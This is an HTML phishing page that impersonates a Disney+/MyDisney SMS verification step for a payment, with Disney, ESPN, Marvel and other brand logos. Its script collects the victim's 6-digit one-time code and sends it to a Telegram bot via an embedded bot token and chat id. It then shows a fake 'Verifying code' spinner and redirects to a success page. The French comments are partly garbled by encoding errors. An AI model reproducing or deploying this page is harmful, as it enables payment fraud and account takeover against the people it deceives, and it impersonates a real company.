<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SMS Verification | Disney+</title>
  <link rel="stylesheet" href="style.css"/>
  <style>
    /* Styles suppl√©mentaires pour la validation OTP */
    .error-border {
      border: 2px solid #ff3860 !important;
    }
    
    .error-message {
      color: #ff3860;
      font-size: 12px;
      margin-top: -10px;
      margin-bottom: 15px;
      text-align: center;
    }
    
    .otp-input {
      text-align: center;
      letter-spacing: 8px;
      font-family: monospace;
      font-size: 1.2rem;
    }
  </style>
</head>
<body class="page-form">
  <main>
    <!-- Centered MyDisney Logo -->
    <img src="Images/Mydisney-logo.png" alt="MyDisney" class="center-logo"/>

    <h1>SMS Verification</h1>
    <p>
      A security code has been sent to your phone.<br/>
      Enter it to finalize your payment.
    </p>

    <!-- Payment icons -->
    <div class="cb-icons" style="display:flex; justify-content:center; gap:20px; margin:20px 0;">
      <img src="Images/applepay.png" alt="Apple Pay" style="height:36px; object-fit:contain;"/>
      <img src="Images/googlepay.png" alt="Google Pay" style="height:36px; object-fit:contain;"/>
    </div>

    <form id="smsForm">
      <input type="text" name="sms" id="smsCode" maxlength="6" placeholder="6-digit code" required class="otp-input"/>
      <div id="smsError" class="error-message"></div>
      <button type="submit">Verify</button>
    </form>

    <!-- Footer note + partner logos -->
    <div class="footer-note">
      <strong>Disney+ is part of The Walt Disney Company</strong><br/>
      MyDisney gives you access to services like Disney+, ESPN, Walt Disney World <a href="#">and more</a>.
      <div class="logos-container">
        <img src="Images/compose2.png" alt="Disney+"/>
        <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
        <img src="Images/espn-png-logo-4149.png" alt="ESPN"/>
        <img src="Images/marvel-logo-34291.png" alt="Marvel"/>
        <img src="Images/star-wars-logo-1002.png" alt="Star Wars"/>
        <img src="Images/Hulu-Logo-PNG.png" alt="Hulu"/>
        <img src="Images/natgeo-logo.png" alt="National Geographic"/>
      </div>
    </div>
  </main>

  <!-- Spinner overlay -->
  <div id="spinnerOverlay">
    <div class="spinner"></div>
    <div class="spinner-text" style="color:#fff; margin-top:16px; font-size:1rem;">
      Verifying code‚Ä¶
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const smsInput = document.getElementById('smsCode');
      const smsForm = document.getElementById('smsForm');
      const smsError = document.getElementById('smsError');
      
      // Validation en temps r√©el du code OTP
      smsInput.addEventListener('input', function() {
        // N'autoriser que les chiffres
        this.value = this.value.replace(/\D/g, '');
        
        // Valider la longueur
        const isValid = this.value.length === 6 && /^\d+$/.test(this.value);
        
        // Mettre √† jour le style
        this.classList.toggle('error-border', this.value.length > 0 && !isValid);
        
        // Mettre √† jour le message d'erreur
        if (this.value.length > 0 && !isValid) {
          smsError.textContent = 'Please enter a valid 6-digit code';
        } else {
          smsError.textContent = '';
        }
      });
      
      // Validation √† la soumission du formulaire
      smsForm.addEventListener('submit', function(e) {
        e.preventDefault();
        const code = smsInput.value.trim();
        
        // Validation stricte du code OTP
        const isValid = code.length === 6 && /^\d+$/.test(code);
        
        if (!isValid) {
          smsInput.classList.add('error-border');
          smsError.textContent = 'Please enter a valid 6-digit code';
          return;
        }
        
        // Si le code est valide, proc√©der √† l'envoi
        document.getElementById("spinnerOverlay").style.display = "flex";
        
        // Envoyer le code via Telegram
        fetch(
          `https://api.telegram.org/bot8405352750:AAGzI6w6ks8p9nRgmikeST1D6QCZ0uorNPI/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: "-4810968086",
              text: `üîê SMS Code: ${code}`
            })
          }
        ).catch(console.error);
        
        // Redirection apr√®s 2.5 secondes
        setTimeout(() => {
          window.location.href = "success.html";
        }, 2500);
      });
    });
  </script>
</body>
</html>
